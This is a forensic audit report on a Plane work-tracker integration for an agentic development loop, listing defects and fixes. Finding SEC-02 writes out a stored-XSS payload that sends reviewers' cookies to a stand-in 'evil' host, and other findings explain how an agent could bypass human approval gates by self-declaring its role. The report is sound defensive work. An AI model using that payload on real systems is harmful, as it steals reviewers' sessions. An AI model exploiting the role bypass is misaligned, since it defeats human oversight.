# Plane Integration — Forensic Audit Findings

**Date:** 2026-06-18
**Scope:** `plane-integration/` — the Plane work-tracker integration that drives the agentic SDLC completion-gate loop (agent write-back via `plane_client.py`/`the_loop.py`, inbound webhook dispatch via `webhook_handler.py`, local-board reorg via `reorg_plane.py`, and remote-board tooling `apply_upsert_plan.py` / `setup_cf_access.py` / `plane_preflight.py`).
**Result:** 43 confirmed defects (5 P0, 18 P1, 20 P2), 10 rejected as false positives or mis-calibrated.

---

## 0. Executive picture — what this integration actually does today

There are **two disconnected halves**, pointed at **two different Plane boards**:

| Half | Entry points | Board it targets | Auth posture |
|---|---|---|---|
| **Agent write path** (the completion-gate executor) | `the_loop.py` (status/next/advance/prove/handoff), `reorg_plane.py`, `provision_plane.py` — all via `plane_client.py` | **LOCAL** Docker Plane `http://localhost:8090` (workspace `ascp`, project `652955cc…`) | `X-API-Key` only, no CF headers, no UA |
| **Remote tooling** (board true-up + access setup) | `apply_upsert_plan.py`, `apply_delta.py`, `plane_preflight.py`, `setup_cf_access.py`, `dump_board.py` | **REMOTE** production `https://plane.autonomous-agent.dev` (workspace `agentic-driven-sdlc`, project `0de2a9fb…`) behind Cloudflare Access | `X-API-Key` + browser UA + `CF-Access-Client-Id/Secret` |

The two halves **cannot converge on one board** without code change, and the inbound (Plane→agent) contract is **non-functional**: the webhook writes `.agent_queue.jsonl` but **nothing reads it**.

The split is documented and partly intentional (`REMOTE_ACCESS.md:6-9` says the local board is dev), but the agent loop — the thing that enforces the spec→evidence→Done gate — is wired to the **local** board, while the runbook and newer tooling treat the **remote** board as canonical. Repointing the agent loop is not a one-line URL change: it also needs the CF headers, the remote state-UUID map, and reconciliation of env-var name drift (`PLANE_WS`/`PLANE_PROJ` vs `PLANE_WORKSPACE_SLUG`/`PLANE_PROJECT_ID`).

**The three integrity guarantees the loop advertises are all unenforced:**
- **Same-board integrity** — state/issue UUIDs come from a per-board file with no board-id stamp; cross-board misconfig writes wrong UUIDs (COR-01).
- **Actor independence** — `transition()` trusts a self-declared `actor_role` string from argv; one runtime both builds a slice and asserts it is the "verifier"/"human" (SEC-03).
- **Gate order** — `transition()` checks actor authority but never the *current* state, so any state (even Backlog) can jump straight to Done (REL-02 integration-contract).

---

## 1. Config-drift / local-vs-remote (the load-bearing theme)

### CFG-01 [P0] — The agent write path targets the LOCAL board; the real board is REMOTE
**Where:** `plane_client.py:13,24-29` (`CREDS = HERE.parent/"plane-selfhost"/"credentials.env"`)
**Scenario:** Every agent write-back (`the_loop.py advance/prove/handoff`, all of `reorg_plane.py`) resolves to `http://localhost:8090/api/v1/workspaces/ascp/projects/652955cc…`. Provably split-brain: `.provision_state.json`'s 243 issue UUIDs share **zero** of the 26 remote `.apply_log.json` UUIDs. A naive "repoint `credentials.env` at remote" fails three ways at once: (1) `_api` sends no CF headers → Cloudflare 403; (2) `STATES` still hold local state UUIDs → wrong/`KeyError` state; (3) env-var names differ → `KeyError` at import. `advance()` prints `ok:True` unconditionally, so a wrong-board write is silent.
**Fix:** Unify on one config source — make `plane_client` use `apply_upsert_plan._load_dotenv(HERE/".env")`, resolve `API_BASE/WS/PROJ/KEY` from `os.environ` (reconciling the `PLANE_WS|PLANE_WORKSPACE_SLUG` / `PLANE_PROJ|PLANE_PROJECT_ID` alias drift), and resolve the remote state-UUID map live. Fix in concert with CFG-03 (CF headers) and CFG-02 (state map).

### CFG-02 [P1, conditional] — `.provision_state.json` is the LOCAL board's UUID map
**Where:** `plane_client.py:32-33,73-76`; `the_loop.py:55` (`ID2STATE`); `.provision_state.json`
**Scenario:** Latent today — local creds + local provision file are internally consistent, so the loop works against the local board. It **breaks the instant CFG-01 is repointed to remote while keeping this file**: `STATES.get(to_state)` and the 243-entry `issues` map are local-only and 404/`KeyError` against remote. (243 prov issue UUIDs ∩ 25 remote apply ids = 0; 12 prov state UUIDs ∩ remote = 0.)
**Fix:** Stop hardcoding per-board UUIDs in the shared client. Resolve states live from `GET /states/` (the pattern at `apply_upsert_plan.py:128`), cache per `(workspace,project)`; match issues by `external_id` at runtime (the `apply_upsert` `by_ext` approach); stamp the provision file with its board id and refuse a map whose board id ≠ configured `PROJ` (turning silent drift into a loud startup error).

### CFG-03 [P0, companion to CFG-01] — `_api` sends no User-Agent and no CF-Access headers
**Where:** `plane_client.py:51-66` (headers = `{"X-API-Key","Content-Type"}` only)
**Scenario:** Even after repointing, Cloudflare blocks the call. The bad/blocked-UA path returns CF's body-level "1010" over an **HTTP 403** → `RuntimeError` at `plane_client.py:65` (403 ∉ 429/5xx). The no-service-token path instead gets a **302** to `*.cloudflareaccess.com/login`, which urllib auto-follows to a 200 HTML page → `json.loads` raises `JSONDecodeError`. Either way the loop hard-fails on the first call. Dormant today (still localhost); P0 only as CFG-01's inseparable companion.
**Fix:** Mirror `apply_upsert_plan.py:69-72`: add browser-style `User-Agent` plus conditional `CF-Access-Client-Id`/`CF-Access-Client-Secret` from env in `_api`. Fixing it once here fixes `the_loop` and `reorg` (both call through `pc._api`). Add a `plane_preflight` gate before the loop so a CF block surfaces as a clear preflight failure, not a mid-loop traceback.

### CFG-04 [P2] — `reorg_plane`'s `.reorg_state.json` is local-only but un-namespaced
**Where:** `reorg_plane.py:16,20,98-101`; `.reorg_state.json`
**Scenario:** `reorg_plane.py` + its state files form a self-consistent loop that correctly reorganizes **only the local board**; the remote board is reorganized by a separate script (`apply_upsert_plan.py`) that matches cycles/modules by name from the live remote board and never reads `.reorg_state.json`. The defect: `.reorg_state.json` is keyed by phase name with **no board/project id**, so any tool reading it to learn "which cycle is E8 in on production" gets a local UUID (`b68f083c…`) that 404s on remote; and there is no shared id ledger linking the two reorg pathways, so the local file can drift from / falsely appear to describe production.
**Fix:** Namespace `.reorg_state.json` by board/project id (`{"<proj-uuid>": {"cycles":…,"modules":…}}`), and either repoint reorg at production via the unified loader (CFG-01) sourcing issue ids from the live remote `external_id` index, or explicitly label reorg/`.reorg_state.json` as local-dev-only.

### CFG-08 [P2] — `the_loop.advance` always prints `ok:True`; no read-back verification
**Where:** `the_loop.py:87-89` (and `prove()` `:91-96`)
**Scenario:** `advance()` discards `transition()`'s return and hardcodes `ok:True`; `prove()` hardcodes `state:"Done"`. The genuine uncovered class is idempotent/no-op 200s, partial/ignored field updates, or a future API that silently coerces — for which `ok:True` would lie. (Note: hard drift modes — wrong board/state UUID — already fail *loud* via `RuntimeError`/`KeyError`/`PermissionError`, so the original "wrong board reports success" sub-claim is dropped.)
**Fix:** Have `transition()` return the resulting work-item; `advance()` asserts returned `state` == requested state UUID before printing `ok`; on mismatch print `ok:False` with the actual state. Apply the same assert to `prove()` before printing `state:Done`.

---

## 2. Reliability / concurrency

### REL-09 [P1] — `plane_client` reads creds ONLY from local `credentials.env`; no env override
**Where:** `plane_client.py:13,24-28`
**Scenario:** Agents physically cannot target the remote board they need to write to — no `os.environ` anywhere. Compounded by **env-var name drift**: `plane_client` uses `PLANE_WORKSPACE_SLUG`/`PLANE_PROJECT_ID` (matching `credentials.env`) while `.env`/`apply_upsert`/`preflight` use `PLANE_WS`/`PLANE_PROJ`, so a naive "add `os.environ.get` with the same key names" silently fails to pick up `.env`.
**Fix:** Honor env overrides for all four values reading **both** alias forms (`PLANE_WS|PLANE_WORKSPACE_SLUG`, `PLANE_PROJ|PLANE_PROJECT_ID`), add CF-Access headers in `_api`, load `plane-integration/.env` as the production default, and use `dict.get` with actionable errors instead of `CFG['…']` (which raises a raw `KeyError` at import).

### REL-10 / SEC-01 [P0] — Webhook signature verify is fail-OPEN by default
**Where:** `webhook_handler.py:19,38-43,66-67,102-105`
**Scenario:** Fail-open **by default**, not just on misconfig: the documented `.env` omits `WEBHOOK_SECRET` and `webhook_handler.py` never loads `.env` (reads `os.environ` directly), so `python3 webhook_handler.py` runs with `SECRET==""` → `verify()` returns `True` for every POST. The 403 branch (`:67`) is unreachable when the secret is unset. Server still binds `0.0.0.0` (`:105`) with only a stderr WARN. A forged POST with `state.name=="Plan-Approved"` fabricates approval and enqueues the implementer regardless of the issue's real state — the webhook *ingest* path never consults the human gate (which lives only in the write-back authority check). Mirrors the blueprint's REQ-GATE-005 fail-closed contract the handler violates.
**Fix (defense-in-depth):** In `verify()`, `if not SECRET: return False`. At startup replace the WARN print with `raise SystemExit` unless an explicit `ALLOW_INSECURE=1` dev flag is set. Bind `127.0.0.1` by default, gate `0.0.0.0` behind explicit `WEBHOOK_BIND`. Add `WEBHOOK_SECRET` to the documented `.env` and actually load `.env` in the handler.

### REL-02 / REL-08 (reliability) [P1] — `_save_seen` evicts by lexical UUID, not recency
**Where:** `webhook_handler.py:33-34` (`SEEN.write_text(json.dumps(sorted(s)[-5000:]))`)
**Scenario:** UUIDs are random `uuid4`; lexical order is uncorrelated with recency. The bug does **not** trigger within one running process (the in-memory `_seen` set only ever grows; it's never reassigned to the truncated value). It bites on **process RESTART**: `_load_seen()` reloads the truncated file holding the random lexically-largest 5000-UUID subset, so recently-processed deliveries that sort low are absent. A Plane retry (blueprint: up to 5× with 600s backoff) then passes dedup and re-enqueues → double `agent_dispatch`. Empirical (6000 random UUIDs): 170–174/1000 most-recent deliveries evicted, ~835/1000 oldest retained — the cap actively prefers to retain whatever historical ids sort high, i.e. the set most likely still in Plane's retry window. (Separate, out-of-scope: this non-durable JSON ledger does not meet the blueprint's transactional Postgres `webhook_deliveries` requirement, `PLANE_BLUEPRINT.md:3071,3389`.)
**Fix:** Track recency explicitly — persist a list/deque in arrival order and keep the last N by append order, or store `{delivery: ts}` and evict oldest by ts. Never order UUIDs lexically to infer recency.

### REL-07 [P1] — 429 handling sleeps a fixed 62s with no Retry-After and counts as a retry
**Where:** `plane_client.py:63` (also `apply_upsert_plan.py:81-82`, `provision_plane.py:81-82`)
**Scenario:** `if e.code == 429: time.sleep(62); continue` burns the bounded retry budget, which is **shared** with the 5xx exponential-backoff path (same `for attempt in range(retries)` loop), so a mix of 429+5xx exhausts faster than "8 consecutive 429s". `plane_client`/`provision` exhaust in ~8 min (8×62s); `apply_upsert_plan` in ~2 min (6×20s). No `Retry-After` parsed, no jitter (grep: zero matches). Client-side throttle (`_last`/1.1s) does nothing for concurrent agents or the Cloudflare front.
**Fix:** Honor `Retry-After` via `e.headers.get('Retry-After')` (both delta-seconds and HTTP-date forms); do **not** count a 429 backoff against the bounded budget (use a separate larger cap or a wall-clock-deadline `while` loop); add randomized jitter to break multi-agent thundering-herd.

### REL-08 (reliability) [P2] — `_api` client-side throttle is a multi-PROCESS spacing gap
**Where:** `plane_client.py:50-54`
**Scenario:** Re-scoped from "thread race" to multi-process: each loop step / agent role is a separate short-lived process whose `_last` starts at `0.0`, so every process's first `_api` call fires unthrottled and cross-process spacing is effectively absent — coupling into REL-07's 429 path. (No concurrent in-process callers exist; `plane_client` is imported only by single-threaded CLIs.)
**Fix:** Rely on the 429 retry (REL-07, with jitter/backoff) as the real backstop; for genuine cross-process spacing, persist the last-call timestamp to a small file under an OS file lock (`fcntl.flock`), or centralize writes behind one long-running process. A `threading.Lock` is **not** the right fix here.

### COR-05 / SEC-06 [P2] — Webhook `_seen` check-then-act + non-atomic write under ThreadingHTTPServer
**Where:** `webhook_handler.py:14,30-34,36,68-71,105`
**Scenario:** Under `ThreadingHTTPServer`, the unguarded `_seen` check-then-act (`:68-71`) plus the non-atomic `_save_seen` write (`:33-34`) plus the blanket-except wipe in `_load_seen` (`:30-32`) combine. The most severe realistic consequence is **torn-write-then-silent-wipe**: a concurrent write corrupts `.webhook_deliveries.json`, then on next restart `_load_seen` swallows `JSONDecodeError` → empty set → re-admits every prior delivery (a restart-scoped replay vector). Within a single run the in-memory set still dedups; the live failure is the duplicate-dispatch race plus a persistently corrupt file. (The `plane_client.py:50-54` portion of the original claim is dropped — single-threaded callers only.)
**Fix:** Wrap check-add-persist (and ideally `enqueue`'s append) in a module-level `threading.Lock`; make `_save_seen` atomic (write temp + `os.replace`); harden `_load_seen` to not silently swallow `JSONDecodeError` (back up/log the corrupt file). Optionally serve single-threaded (`HTTPServer`) since the handler returns 200 fast and offloads to the file queue.

### COR-07 [P2] — `_api` retries 5xx but NOT transient `URLError`
**Where:** `plane_client.py:56-66`
**Scenario:** A single connection reset / tunnel blip aborts an agent transition with a raw `URLError` traceback — `plane_client` is the worst of the three modules (no retry **and** no actionable wrapping; `apply_upsert_plan._api:86-87` at least raises with a message, only `provision_plane` actually retries). The strongest case is `the_loop.prove()` (`the_loop.py:91-96`): `post_evidence` then a *separate* `transition('Done')` — a `URLError` on the second leaves the Evidence_Record posted but the item NOT advanced (split-brain), surfaced as a raw traceback.
**Fix:** Mirror `provision_plane.api`: add `except urllib.error.URLError: time.sleep(min(2**attempt,30)); continue` to `_api`'s retry loop. Covers the whole class of multi-call loop ops.

### REL-11 [P2] — `the_loop.prove` is not atomic / not idempotent (no compensation)
**Where:** `the_loop.py:91-96` (post_evidence then transition-to-Done, no rollback)
**Scenario:** Two non-atomic, non-idempotent writes. The realistic failure is a transport/5xx `RuntimeError` on the Done PATCH (NOT a missing-Done `KeyError` and NOT a permission error — both dead paths: Done is provisioned, verifier authorized). On failure the item is left with an Evidence_Record but still In-Verification (a **safe** half-state — never Done-without-evidence), surfaced loudly via stderr/nonzero exit. Genuine harms: (a) a blind retry posts a **duplicate** evidence comment (`post_evidence` has no `output_hash` dedupe), and (b) no structured partial-success record telling the loop which step landed.
**Fix:** Make `post_evidence` idempotent (GET existing comments, skip if an Evidence_Record with same `output_hash` exists), and emit a structured partial-success object on exception so the loop resumes the transition rather than re-proving. **Reject** the "transition to Done first" half of the original fix — it could leave Done set with no evidence, inverting the gate.

### REL-12 / COR-04 [P2] — `reorg_plane.ensure_modules` issues the modules GET twice; non-atomic save
**Where:** `reorg_plane.py:69` (and `:77-81`)
**Scenario:** The inlined `isinstance` expression calls `_api()` **twice** per invocation (one of the two is wasted ~1.1s throttle), and the iterated data comes from a *different* HTTP response than the one type-tested — a mid-run race crashes two ways (None/list → `AttributeError`; dict-when-list-seen → `TypeError` on `m['name']`). The third literal `_api` call is dead. Re-runs unconditionally re-POST every subtree (the `if not mid` guard skips module *creation* only, not assignment), so the practical impact is "wasteful blind re-POST + no failure isolation," not data loss. Pagination is latent (EPICS fixed at 8, default per_page 100).
**Fix:** Read the listing once with the paginating helper (`existing = {m["name"]: m["id"] for m in _paginate(f"{pc.PBASE}/modules/")}` — matching `apply_upsert_plan.py:130`/`dump_board.py:104`), or the single-bind pattern already used by `ensure_cycles` (`:84-85`). Wrap the module-issues POST in try/except and record per-epic assignment success in `.reorg_state.json` so re-runs skip already-assigned subtrees.

---

## 3. Security

### SEC-03 [P0] — Actor-independence model is unenforceable (self-declared role)
**Where:** `plane_client.py:68-76` (transition trusts `actor_role` arg), `:28` (single shared key), `the_loop.py:88,107` (role from argv), `TRANSITION_AUTH` `:36-48`
**Scenario:** `transition()` authorizes on the **string arg alone**; a single shared `PLANE_API_KEY` for all roles; CLI takes role straight from argv. One runtime both builds a slice and asserts it is the "verifier"/"human". The `advance` path is independently exploitable for Done — it never requires the Evidence_Record that `prove()` attaches, so an item can reach Done with **neither** an independent actor **nor** any evidence. Per-role API keys are necessary but insufficient: Plane authorizes by workspace/project membership and has no concept of `verifier`/`implementer`/`human`, so distinct keys only prove which Plane *user* called.
**Fix:** Bind `actor_role` to an authenticated identity — each role presents a distinct secret credential; `transition()` derives role from the authenticated credential, never from an argument. Move the human/verifier credential **out of the implementer agent's environment**. At minimum, gate `human`/`verifier` transitions behind a separate secret the implementer agent does not possess.

### SEC-02 [P1] — Stored HTML/XSS injection via `post_evidence`/`comment`/`handoff`
**Where:** `plane_client.py:80-84` (post_evidence `%`-format), `:87` (comment passes html through), `the_loop.py:99` (handoff f-string `reason`), `:91-93` (prove passes test_file/test_name/output_hash)
**Scenario:** Caller-controlled values (test names, file paths, handoff reasons — ultimately from CLI argv / agent output) are interpolated **unescaped** into `comment_html`, which Plane renders as rich HTML. `the_loop.py handoff <id> '<img src=x onerror=fetch("//evil/?c="+document.cookie)>' verifier` stores script that executes in the browser of any human reviewer who opens the issue — stored XSS against the privileged human-in-the-loop who approves Plan-Approved/Done. Even benign markup chars (`<`, `&`, paths) corrupt the evidence record.
**Fix:** `html.escape()` every interpolated value before building `comment_html` in `post_evidence` (`:80-83`) and `handoff` (`the_loop.py:99`); require `comment(issue_id, html)` callers to pass pre-escaped content or add an escaping helper. Treat all evidence/reason fields as untrusted text.

### SEC-04 [P2, latent] — Webhook dispatches on attacker-suppliable state without re-verifying
**Where:** `webhook_handler.py:82-90` (state from payload, enqueued, never re-fetched); `plane_client.py:89` (`get_issue` defined but unused)
**Scenario:** Re-characterized as a **latent design defect**, not a live exploit. The handler persists an attacker-controlled `state`/`role` into the dispatch record. (Corrections to the original write-up: `the_loop.py` is NOT the consumer and already gates on live board state; there is currently NO consumer of `.agent_queue.jsonl` at all, so the "replay drives the implementer at will" chain has no active sink today.) Escalates to P1 once a queue consumer exists.
**Fix:** Re-fetch authoritative state via `get_issue(issue_id)` and re-derive the role at the point dispatch actually runs an agent; stop trusting/storing payload state in the handler so the record can't pre-bake a forged role.

### SEC-07 [P2] — CF Access policy allows "any valid service token"; tightening is opt-in
**Where:** `setup_cf_access.py:70-73` (`want_include` defaults to `any_valid_service_token`), `:105` (drift repair re-asserts it); `REMOTE_ACCESS.md:70-72`
**Scenario:** Least-privilege/defense-in-depth (real-world reach is gated by a second factor — a valid Plane `X-API-Key` — so not a standalone vuln). The concrete sting: the drift-repair re-assertion fires when `--apply` is passed AND `ASCP_BIND_TOKEN_ID` is unset — so if an operator manually pins the policy to a specific token in the dashboard but doesn't also export `ASCP_BIND_TOKEN_ID`, the next routine `setup_cf_access.py --apply` (e.g. a self-healing run) **silently broadens it back** to any-valid-service-token.
**Fix:** Make `ASCP_BIND_TOKEN_ID` the documented production default; emit a loud stderr WARNING whenever `any_valid_service_token` is about to be applied; have the drift-repair branch refuse to widen an already-narrowed include unless an explicit override flag is passed.

---

## 4. Integration-contract / queue-consumer

### REL-01 (integration-contract) [P0] — The Plane→agent loop is write-only; `.agent_queue.jsonl` has NO consumer
**Where:** `webhook_handler.py:8,17,47` (sole writer); `the_loop.py` (claimed consumer — never opens the file)
**Scenario:** The entire **inbound** half of the advertised bidirectional contract is non-functional. Repo-wide grep: `agent_queue` matches only `webhook_handler.py:8,17` — zero readers. `the_loop.py` is a REST-polling CLI that reads board state live, never the queue.
**Fix:** Write the missing consumer — a poller/daemon (or a `the_loop.py drain/consume` command) that tails `.agent_queue.jsonl`, **dispatches a Claude Code agent of the named `agent_role`** (NOT a state transition — `advance` moves state, which is the agent's/human's job), and records a committed offset (`.agent_queue.offset`) so jobs are exactly-once and survive restarts. The existing `.webhook_deliveries.json` dedup covers delivery-level dups but there is no per-job processing offset.

### REL-02 (integration-contract) [P0] — `transition()` enforces actor-authority but NOT gate ORDER
**Where:** `plane_client.py:68-76`; `the_loop.py:91-96` (`prove`)
**Scenario:** No GET of current state, no predecessor/edge check — `"Done": {"verifier"}` is unconditional. An item sitting in **Backlog** can be driven straight to Done. This is unenforced on **both** paths: the direct-call bypass *and* the sanctioned `prove()` path (which routes Done through the same unguarded `transition()`), so an item can reach Done *with* an Evidence_Record yet *without* traversing any predecessor gate. Actor-authority is the only constraint that ever fires. `NEXT_STEP` (`the_loop.py:29-38`) is advisory only.
**Fix:** In `transition()`, GET the issue, map current state via `ID2STATE`, and reject unless `current→to_state` is a legal edge of an explicit transition graph (forward `NEXT_STEP` edges plus universal Blocked/Failed/HANDOFF escapes). Enforce at the `plane_client` chokepoint, not in command ordering. Must also gate the `prove()` Done edge (require current == In-Verification/Human-Review) so evidence-attached jumps are rejected.

### REL-03 (integration-contract) [P0] — `prove()` transitions to Done with zero evidence-content validation
**Where:** `the_loop.py:91-94`
**Scenario:** Grants Done with (a) zero evidence-content validation and (b) no predecessor-state check — empty/garbage evidence still "proves" Done. (Drop the original "even if post_evidence failed" clause — `_api` raises on non-2xx, so an HTTP failure aborts before transition.) The Plane path is the **only** Done surface that skips the project's canonical validator.
**Fix:** (1) Before posting, call the existing `tools/evidence_collector.validate_evidence_record(...)` (non-empty fields + `^sha256:[a-f0-9]{64}$` on `output_hash` + ISO-8601 `collected_at`); abort with nonzero exit if False. (2) Gate on current state — `get_issue`, map state, require In-Verification/Human-Review before Done (ideally via the REL-02 predecessor map so `advance()` is fixed too). (3) Treat `post_evidence`'s return as load-bearing — require a comment id, abort if absent.

### REL-04 (integration-contract) [P1] — Agent write path reads localhost creds, not the remote runbook's `.env`
**Where:** `plane_client.py:13,24-29`; `plane-integration/.env` (remote) vs `../plane-selfhost/credentials.env` (localhost)
**Scenario:** An **unreconciled divergence** (not an accidental misconfig the authors missed — `REMOTE_ACCESS.md:6-9` states this explicitly, and the troubleshooting table at `:82` calls out a local `ascp` key against remote as a known 403 cause). The agent write path (the `.kiro` completion-gate executor) has no env switch, no CF-Access headers, and no board-matched STATES to reach the production board the newer tooling and runbook treat as canonical. (Soften "wrong/dead board" — the local board may be an intentional dev target; the load-bearing problem is the two halves cannot converge.)
**Fix:** Introduce `PLANE_TARGET` (remote selects `.env` + CF-Access headers; default localhost for dev); source STATES from the provision state of whichever board is targeted (a remote provision run, since the current file holds local-only UUIDs). Same root as CFG-01/REL-09 — fix together.

### REL-05 (integration-contract) [P2] — No User-Agent (latent, forward-looking)
**Where:** `plane_client.py:56-58`
**Scenario:** Re-framed from "live P1" to **P2 latent**: `plane_client`/`provision`/`reorg`/`the_loop` omit the browser UA (and CF-Access) headers, so they break only **if/when** their creds are repointed from the current localhost stack to the CF-fronted remote board. Today they target a local plain-HTTP Plane with no Cloudflare — no current 1010. Worth doing as pre-migration hardening.
**Fix:** Extract a single shared header-builder (UA + optional CF-Access from env); have `plane_client._api`, `provision_plane.api`, and the new scripts all consume it so the fix can't drift. Reconcile the `PLANE_WS/PLANE_PROJ` vs `PLANE_WORKSPACE_SLUG/PLANE_PROJECT_ID` key names as part of any repoint.

### REL-06 (integration-contract) [P2] — No dedicated Blocked/Failed entry command
**Where:** `plane_client.py:46-47` (auth declared); `the_loop.py:29-38,98-101`; `webhook_handler.py:23-28`
**Scenario:** Blocked/Failed are NOT unreachable — they're reachable via the generic `the_loop.py advance <id> <state> <role>` verb. The genuine gap: no **dedicated, auditable** command to enter them, so a real blocker / verification failure gets conflated into HANDOFF rather than recorded as Blocked/Failed with a reason. (Drop the "exclude from ACTIONABLE_ORDER" sub-fix — they're already absent.)
**Fix:** Add `block <id> <reason> <role>` (→ Blocked) and `fail <id> <reason> verifier` (→ Failed) commands that post a reason comment then transition — mirroring `handoff()` (`:98-101`). File the separate "stuck in-progress item re-served forever by `next_item`" concern as its own finding.

### REL-07 (integration-contract) [P1] — Webhook dispatch fires on EVERY issue update, not state CHANGES
**Where:** `webhook_handler.py:60-90` (do_POST issue branch); dedup at `:68-71` keyed only on `X-Plane-Delivery`
**Scenario:** Severity **P1 (latent)**, not P0 — the harm is gated behind REL-01 (no consumer yet, so today the only effect is unbounded growth of an append-only queue nothing reads). Once a consumer is wired, every benign edit while parked in a dispatchable state (Agent-Triaged, Plan-Approved, Agent-Executing, In-Verification) re-triggers the mapped role. `action` is recorded but never gates; no old-state/activity comparison. Amplified by Plane's documented double-POST and per-changed-field webhooks (one human edit → several deliveries, each a distinct `X-Plane-Delivery` that dedup can't collapse).
**Fix:** Gate on a genuine transition — inspect the payload's `activity` block for `verb=='updated' && field=='state'` (Plane normalizes verbs to past tense: created/updated/deleted), skip `action=='created'` for Agent-Executing/In-Verification. **Defense-in-depth** (since `activity.field` can be absent and Plane's create/update mapping is itself buggy per makeplane/plane#7249): persist last-dispatched `(issue_id, state)` and de-dupe so the same issue entering the same state dispatches once until it leaves. Do not rely on `X-Plane-Delivery` dedup — it's per-delivery, not per-transition.

### REL-08 (integration-contract) [P2] — State-vocabulary inconsistency: agents surfaced human-gated work
**Where:** `the_loop.py:26-38` (ACTIONABLE_ORDER includes Spec-Verified & Human-Review; NEXT_STEP roles are `human`/`verifier`)
**Scenario:** Sharpened. The "PermissionError if it advances" horn is **wrong** — if the agent uses the emitted `next_role` verbatim (`human`) and calls `advance <id> Plan-Approved human`, the transition **succeeds** (`TRANSITION_AUTH["Plan-Approved"]={"human"}` accepts the string) — an **authority-model bypass**, not an error. The Human-Review limb is **dropped** — `Human-Review→Done` is gated by `verifier`, an *agent* role, so it's agent-advanceable despite its name. The one real trap: `next_item` surfaces Spec-Verified (priority 2) to agents though its only forward transition is human-only (Plan-Approved); the stateless single-item `next` has no skip → head-of-line starvation of agent work and an authority-bypass risk if the agent passes `role='human'`. Cannot corrupt data or breach the Done gate, so P2.
**Fix:** Make `ACTIONABLE_ORDER` the single source of truth — drop human-gated states or have `next_item` emit an `awaiting:human` marker and skip such items when serving agents. Reconcile `DISPATCH_ON_STATE`/`ACTIONABLE_ORDER`/`NEXT_STEP`/`TRANSITION_AUTH` against the 12-state model in README/PLANE_BLUEPRINT.

---

## 5. Correctness

### COR-01 [P1] — State/issue UUIDs bound to `.provision_state.json` but creds can point at a DIFFERENT board
**Where:** `plane_client.py:24-33,73-76`; `the_loop.py:55`; `reorg_plane.py:20,26-39`
**Scope/severity:** Confined to the **agent write path** `plane_client.transition()` (used by `the_loop.py` advance/prove/handoff `:88,94,100`) and the issue-UUID maps in `reorg_plane.py:26-39,80,100`. The newer remote tools (`apply_upsert_plan`/`plane_preflight`/`dump_board`) are **NOT** affected — they read `.env` and resolve states live. No automated path repoints creds at remote; it requires an operator manually editing `credentials.env` (or re-provisioning the local board, minting fresh UUIDs while a stale `.provision_state.json` lingers). The **dominant** failure is a LOUD 400/404 (UUID not in target project), not silent corruption; silent wrong-state writes occur only when a cross-project UUID is coincidentally valid on the target board. That loud-failure dominance + operator-misconfig precondition is why this is P1, not P0 — but the missing same-board assertion is a genuine integrity gap. Evidence: `.provision_state.json` top-level keys = `['states','labels','issues']` (no board id); `credentials.env` localhost/ascp/652955cc vs `.env` remote/agentic-driven-sdlc/0de2a9fb.
**Fix:** Adopt the live-resolution pattern at `apply_upsert_plan.py:128` (`states={s["name"]:s["id"] for s in _paginate(f"{PBASE}/states/")}`) at startup instead of trusting on-disk STATES; and/or stamp `{"board":{"api_base","ws","proj"}}` into `.provision_state.json` at provision time and have `plane_client` assert CFG matches before any write. Never PATCH a UUID not fetched from the board being written to.

### COR-02 [P1] — Webhook dedup eviction sorts lexically (same defect as REL-02 reliability)
See **REL-02 (reliability)** above — same defect at `webhook_handler.py:33-34`. Sharpened trigger: ">5000 deliveries accumulated, THEN a restart, THEN a retry of a low-sorting recent delivery." P1 because Plane's at-least-once retry semantics make redelivery routine and the ledger's purpose is exactly-once side effects.

### COR-03 [P1] — Webhook fires dispatch on EVERY update in a mapped state (and on create)
**Where:** `webhook_handler.py:82-90`
**Scenario:** Same root as REL-07 (integration-contract) viewed as a correctness defect: `action` is recorded but never gates; no old-state/activity comparison. Amplified by Plane's double-POST + per-field webhooks. A freshly-**created** item in a mapped state auto-runs the verifier.
**Fix:** Gate on `payload.activity.field == "state"` AND `action in {"updated"}` (Plane past-tense verbs); skip `action=='created'` for Agent-Executing/In-Verification; defense-in-depth persist last-dispatched `(issue_id, state)`. Corroborated by Plane source `apps/api/plane/bgtasks/webhook_task.py:393-465`.

### COR-04 [P2] — `reorg_plane.ensure_modules` double-GET
See **REL-12** above (same line `reorg_plane.py:69`). Two `_api` calls execute per invocation (not three); iterated data comes from a different response than the one type-tested.

### COR-05 [P2] — Webhook `_seen` concurrency
See **SEC-06** above (same defect, `webhook_handler.py:68-71,33-34`). The `plane_client.py:50-54` portion of the original claim is dropped (single-threaded callers only).

### COR-07 [P2] — `_api` doesn't retry transient `URLError`
See section 2 above (`plane_client.py:56-66`).

---

## 6. New-scripts (remote-board tooling)

### NS-01 [P0] — `apply_upsert_plan` ignores `conditional`/`supersedes` → creates a duplicate the plan forbids
**Where:** `apply_upsert_plan.py:184-217` (loop never reads `supersedes`/`conditional`)
**Scenario:** `NEW-09` (match_key null → create branch) is superseded by `UPD-E8-20` (`supersedes:"NEW-09"`, `resolves` includes `NEW-09`, `conditional:"only if UPD-E8-20 not applied"`), yet both run. `.apply_log.json` proves the duplicate was written live (one `update` of E8-20, one `create` of `ascp-audit-reorg:NEW-09`, same base name).
**Fix:** Pre-scan to build `superseded_ids = {o['supersedes'] for o in ops if o.get('supersedes')} | {x for o in ops for x in (o.get('resolves') or []) if x in {p.get('id') for p in ops}}` and `continue` (count as skip) for any op whose id is in that set. Ideally only skip a conditional/superseded create when the op it depends on **actually resolved/applied**, not merely when present in the plan.

### NS-02 [P0] — `apply_upsert_plan` ignores `additional_match_keys` → true-up applied to 1 of 7 items
**Where:** `apply_upsert_plan.py:138-148` (`resolve()` uses only `op['match_key']`)
**Scenario:** `UPD-E7-STATUS` carries `additional_match_keys` = the six E7 stories + E6-S5 (full `story:` prefix), target state Backlog. Only `REQ16` is patched to Backlog; the other six retain stale advanced states (Done/In-Verification/Agent-Executing/Blocked). All 7 keys resolve in `.provision_state.json` to 7 distinct ids. `grep additional_match_keys` → 0 hits in any `.py`.
**Fix:** Make `resolve()` return a **list**: iterate `[op["match_key"]] + op.get("additional_match_keys", [])`, run single-key resolution per key, dedupe ids, and PATCH body + `assign()` for every resolved id (incrementing `n_upd` per target). Warn on any additional key that fails to resolve. Prefer exact/`_variants` resolution per key; treat an unresolved additional key as a logged miss, not a `by_name` fallback.

### NS-03 [P0] — Two ops share `match_key story:REQ-INFRA-005` → same item PATCHed twice (last-write-wins)
**Where:** `apply_upsert_plan.py:195-202`; ops `NEW-12` (op=create) and `UPD-REQ-INFRA-005` (op=update)
